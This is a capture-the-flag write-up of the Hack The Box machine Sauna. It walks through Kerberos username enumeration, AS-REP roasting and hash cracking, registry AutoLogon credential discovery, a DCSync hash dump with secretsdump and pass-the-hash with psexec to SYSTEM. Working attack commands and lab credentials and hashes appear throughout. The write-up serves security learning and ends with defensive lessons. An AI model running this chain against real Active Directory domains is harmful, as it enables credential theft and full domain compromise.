---
title: 'Sauna'
target: 'Hack The Box — Sauna'
difficulty: 'easy'
date: 2025-01-13
summary: 'An easy Windows AD box — enumerating Kerberos usernames with kerbrute, AS-REP roasting fsmith''s hash and cracking it with hashcat, discovering svc_loanmanager AutoLogon credentials via winPEAS, identifying DCSync permissions with BloodHound, dumping all domain hashes with secretsdump, and pass-the-hash with psexec for SYSTEM.'
role: 'pentest'
tags: ['nmap', 'rustscan', 'ldap', 'ldapsearch', 'kerberos', 'kerbrute', 'as-rep-roasting', 'impacket', 'hashcat', 'evil-winrm', 'winpeas', 'bloodhound', 'dcsync', 'secretsdump', 'psexec', 'pass-the-hash', 'active-directory', 'privilege-escalation', 'windows']
problem: 'A Windows DC for EGOTISTICAL-BANK.LOCAL with fsmith''s Kerberos pre-auth disabled (AS-REP roastable). The registry stores AutoLogon credentials for svc_loanmanager, and the svc_loanmgr account has DCSync privileges allowing full domain hash extraction.'
action: 'Rustscan and nmap identified 14 open ports on a DC for EGOTISTICAL-BANK.LOCAL. DNS zone transfers, RPC null sessions, and anonymous SMB all failed; LDAP anonymous bind confirmed the domain. Kerbrute brute-forced valid usernames (hsmith, fsmith, Administrator), and AS-REP roasting fsmith returned a crackable hash — hashcat mode 18200 with rockyou.txt revealed Thestrokes23. Logged in via evil-winrm as FSmith and ran winPEAS, which found AutoLogon credentials for svc_loanmanager (Moneymakestheworldgoround!). BloodHound showed svc_loanmgr had DCSync permissions; secretsdump dumped all domain NTLM hashes, and psexec with the Administrator hash gave a SYSTEM shell.'
outcome: 'Gained SYSTEM on the DC. The chain was Kerberos username enumeration, AS-REP roasting fsmith, AutoLogon credential discovery for svc_loanmanager, DCSync hash dump, and pass-the-hash as Administrator.'
draft: false
---

## Background

Sauna is an easy-rated Windows machine that serves as an introduction to Active Directory enumeration and exploitation. The attack path covers several fundamental AD techniques — username enumeration through Kerberos, AS-REP roasting to obtain a crackable hash without needing credentials, credential discovery through registry AutoLogon entries, and DCSync abuse to dump the entire domain's password hashes. Each step requires understanding a different aspect of how Active Directory authentication and replication work, making this machine a practical walkthrough of the AD kill chain from anonymous enumeration to domain compromise.

---

## Enumeration

Starting with a rustscan for quick port discovery:

```
rustscan -a 10.10.10.175
```

```
Open 10.10.10.175:53
Open 10.10.10.175:80
Open 10.10.10.175:88
Open 10.10.10.175:135
Open 10.10.10.175:139
Open 10.10.10.175:389
Open 10.10.10.175:445
Open 10.10.10.175:464
Open 10.10.10.175:593
Open 10.10.10.175:636
Open 10.10.10.175:3268
Open 10.10.10.175:3269
Open 10.10.10.175:5985
Open 10.10.10.175:9389
```

Fourteen open ports — a classic Active Directory domain controller signature. Running nmap with default scripts and version detection against the identified ports:

![Nmap scan output showing port 53/tcp open running Simple DNS Plus, port 80/tcp open running Microsoft IIS httpd 10.0 with http-title Egotistical Bank Home, port 88/tcp open running Microsoft Windows Kerberos, port 135/tcp open running Microsoft Windows RPC, port 139/tcp open running Microsoft Windows netbios-ssn, port 389/tcp open running Microsoft Windows Active Directory LDAP for Domain EGOTISTICAL-BANK.LOCAL with Default-First-Site-Name, port 445/tcp open running microsoft-ds, port 464/tcp open running kpasswd5, port 593/tcp open running Microsoft Windows RPC over HTTP 1.0, port 636/tcp open running tcpwrapped, port 3268/tcp open running LDAP for Domain EGOTISTICAL-BANK.LOCAL, port 3269/tcp open running tcpwrapped, port 5985/tcp open running Microsoft HTTPAPI httpd 2.0, and port 9389/tcp open running .NET Message Framing. Service Info shows Host SAUNA, OS Windows. Host script results show clock-skew of 7h00m00s and smb2-security-mode with message signing enabled and required.](/writeups/htb-sauna/01-nmap-scan.png)

The nmap output confirms this is a Windows domain controller for **EGOTISTICAL-BANK.LOCAL**. Key services include DNS (53), HTTP (80) running IIS 10.0 with the title "Egotistical Bank :: Home", Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985), and .NET Message Framing (9389). The 7-hour clock skew is noted — this will matter for Kerberos interactions. SMB signing is enabled and required, ruling out relay attacks.

---

## Service enumeration

With a domain controller exposing this many services, the approach is to systematically test each one for anonymous or null session access. Starting with DNS — attempting zone transfers against both the discovered domain and a hostname-based guess:

```
dig axfr @10.10.10.175 egotistical-bank.local
dig axfr @10.10.10.175 sauna.htb
```

Both zone transfers fail — the DNS server doesn't allow them. Moving to RPC and SMB:

![Terminal showing three failed attempts — rpcclient egotistical-bank.local -U="" returning NT_STATUS_LOGON_FAILURE, smbclient -L \\\\10.10.10.175\\ with default credentials prompting for password, and smbclient -L \\\\10.10.10.175\\ -U anonymous returning session setup failed NT_STATUS_LOGON_FAILURE.](/writeups/htb-sauna/02-rpc-smb-fail.png)

Null sessions are rejected across the board — `rpcclient` with an empty username fails, `smbclient` with default credentials returns nothing useful, and anonymous SMB access is denied. This is expected on a reasonably configured domain controller.

LDAP, however, allows anonymous binding:

![Terminal showing ldapsearch -x -H ldap://10.10.10.175 -w '' -D '' -b 'DC=egotistical-bank,DC=local' returning extended LDIF results with LDAPv3, base DC=EGOTISTICAL-BANK,DC=LOCAL with scope subtree. The first result shows the domain object EGOTISTICAL-BANK.LOCAL with objectClass top, domain, and domainDNS, distinguishedName DC=EGOTISTICAL-BANK,DC=LOCAL, instanceType 5, whenCreated 20200123054425.0Z, and various sub-references including ForestDnsZones, DomainDnsZones, and Configuration.](/writeups/htb-sauna/03-ldapsearch.png)

The anonymous LDAP bind succeeds and returns domain structure information, confirming `DC=EGOTISTICAL-BANK,DC=LOCAL`. However, LDAP enumeration alone doesn't yield a clean list of user accounts. The naming contexts were also confirmed with a base scope query:

```
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
```

```
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
```

---

## Kerberos username enumeration

With Kerberos on port 88, username brute-forcing is possible — Kerberos responds differently to valid and invalid usernames, and tools like `kerbrute` exploit this to enumerate accounts without authentication. Using the `xato-net-10-million-usernames.txt` wordlist:

```
kerbrute userenum -d egotistical-bank.local --dc 10.10.10.175 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
2025/01/13 19:21:01 >  [+] VALID USERNAME:       hsmith@egotistical-bank.local
2025/01/13 19:21:47 >  [+] VALID USERNAME:       Administrator@egotistical-bank.local
2025/01/13 19:24:34 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local
```

Three valid usernames — `hsmith`, `Administrator`, and `fsmith`. With valid usernames in hand, the next step is checking for accounts with Kerberos pre-authentication disabled.

---

## AS-REP roasting

When Kerberos pre-authentication is disabled on an account (`UF_DONT_REQUIRE_PREAUTH`), anyone can request a Ticket Granting Ticket (TGT) for that user without knowing their password. The TGT response is encrypted with the user's password hash, making it crackable offline. Using `impacket-GetNPUsers` with the discovered usernames:

![Terminal showing impacket-GetNPUsers egotistical-bank.local/ -usersfile users.txt with Impacket v0.12.0. The output shows hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set, but fsmith returns a full krb5asrep hash starting with $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL.](/writeups/htb-sauna/04-asreproast.png)

`hsmith` has pre-authentication enabled, but `fsmith` does not — the AS-REP hash is returned. This hash can be cracked offline. First, identifying the correct hashcat mode:

```
hashcat hash
```

Hashcat identifies the hash type as Kerberos 5 AS-REP etype 23, mode **18200**. Cracking it with `rockyou.txt`:

```
hashcat hash -m 18200 /usr/share/wordlists/rockyou.txt
```

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23
```

The password is **Thestrokes23**.

---

## Initial foothold — evil-winrm

With WinRM on port 5985 and valid credentials, `evil-winrm` provides interactive PowerShell access:

```
evil-winrm -i egotistical-bank.local -u fsmith -p Thestrokes23
```

```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
72703c7efae9f3fcc57fe0c661c997db
```

A shell as FSmith and the user flag retrieved. The next step is enumerating the domain from an authenticated position.

---

## Post-exploitation enumeration

Uploading winPEAS to the target via an SMB server for automated enumeration:

```
impacket-smbserver -smb2support temp .
```

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> net use \\<attacker-ip>\temp
*Evil-WinRM* PS C:\Users\FSmith\Documents> copy \\<attacker-ip>\temp\winpeas.exe winpeas.exe
```

Running winPEAS reveals a critical finding — AutoLogon credentials stored in the Windows registry:

![WinPEAS output showing Home folders found including C:\Users\Administrator, C:\Users\FSmith with AllAccess, C:\Users\Public, and C:\Users\svc_loanmgr. Below it, the AutoLogon credentials section shows DefaultDomainName as EGOTISTICALBANK, DefaultUserName as EGOTISTICALBANK\svc_loanmanager, and DefaultPassword as Moneymakestheworldgoround! highlighted in red.](/writeups/htb-sauna/05-winpeas-autologon.png)

**AutoLogon credentials** for `EGOTISTICALBANK\svc_loanmanager` with the password **Moneymakestheworldgoround!**. AutoLogon stores credentials in the registry so the system can automatically log in a service account at boot — the password is stored in plaintext under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`.

Running BloodHound with the discovered credentials reveals that the `svc_loanmgr` account has **DCSync privileges** — specifically, the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions. These are the exact permissions needed to replicate the domain's NTDS.DIT database, which contains every user's password hash.

---

## DCSync — dumping domain hashes

With DCSync privileges, `impacket-secretsdump` can impersonate a domain controller and request password replication data for every account in the domain:

![Terminal showing impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175' with Impacket v0.12.0. RemoteOperations failed with DCERPC Runtime Error rpc_s_access_denied. Dumping Domain Credentials using DRSUAPI method to get NTDS.DIT secrets. Output shows hashes for Administrator (500), Guest (501), krbtgt (502), HSmith (1103), FSmith (1105), svc_loanmgr (1108), and SAUNA$ (1000) — each with their full NTLM hash in the format domain\user:rid:lmhash:nthash.](/writeups/htb-sauna/06-secretsdump.png)

Every account's NTLM hash is dumped — Administrator, Guest, krbtgt, HSmith, FSmith, svc_loanmgr, and the machine account SAUNA$. The Administrator hash is `823452073d75b9d1cf70ebdf86c7f98e`.

Verifying the hash works with `crackmapexec`:

```
crackmapexec smb 10.10.10.175 -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
```

The response includes `Pwn3d!` — confirming the hash is valid and the account has administrative access.

---

## Privilege escalation — pass-the-hash

With the Administrator's NTLM hash, `impacket-psexec` performs a pass-the-hash attack — authenticating with the hash directly without needing to crack the password:

![Terminal showing impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.10.175 administrator@10.10.10.175 with Impacket v0.12.0. Output shows requesting shares, finding writable share ADMIN$, uploading DWMLRnzI.exe, opening SVCManager, creating and starting service HfOu, and dropping into a shell. Microsoft Windows Version 10.0.17763.973. The C:\Windows\system32 prompt shows whoami returning nt authority\system.](/writeups/htb-sauna/07-psexec-system.png)

`psexec` uploads a service binary to the ADMIN$ share, creates and starts a Windows service, and provides a SYSTEM shell. The `whoami` command confirms **nt authority\system** — full domain controller compromise. The root flag was retrieved.

---

## What I took from this

Sauna walks through the standard Active Directory attack methodology in a clean, linear progression. The enumeration phase demonstrates a systematic approach to AD reconnaissance — testing each service for anonymous access, with DNS zone transfers, RPC null sessions, SMB anonymous access, and LDAP anonymous binds all yielding different results. The key takeaway from this phase is that even when most services reject anonymous access, individual services may still leak information. LDAP returned the domain structure even though RPC and SMB were locked down, and Kerberos username enumeration worked because the protocol inherently reveals whether an account exists through its error responses.

AS-REP roasting targets a specific misconfiguration — disabling Kerberos pre-authentication. Pre-authentication exists to prevent exactly this attack: without it, anyone can request a TGT for the account and crack it offline. In practice, pre-authentication is sometimes disabled for compatibility with older systems or applications that don't support it, and it only takes one misconfigured account to provide initial access. The fix is straightforward — ensure `UF_DONT_REQUIRE_PREAUTH` is not set on any account — but it's frequently overlooked during AD audits.

The escalation from FSmith to svc_loanmanager through AutoLogon credentials is a reminder that Windows stores more secrets in the registry than most administrators realize. AutoLogon is a convenience feature designed for kiosks and service accounts, but the password is stored in cleartext at a well-known registry path. Any authenticated user can read it, and tools like winPEAS check for it automatically. The broader lesson is that post-exploitation enumeration on Windows should always include registry credential searches — AutoLogon, cached credentials, service account passwords, and stored VPN or wireless credentials.

The DCSync attack is the culmination of the chain and the most dangerous step. DCSync doesn't exploit a vulnerability — it abuses legitimate Active Directory replication. Domain controllers normally replicate password data between themselves using the DS-Replication permissions, and an account with those permissions can impersonate a domain controller to request the same data. The svc_loanmgr account having these permissions is a significant misconfiguration — service accounts rarely need replication rights, and granting them effectively gives that account the keys to the entire domain. BloodHound identified this path automatically, which highlights why AD enumeration tools are essential during post-exploitation: the permission chain from svc_loanmgr to full domain compromise isn't visible through manual enumeration alone.
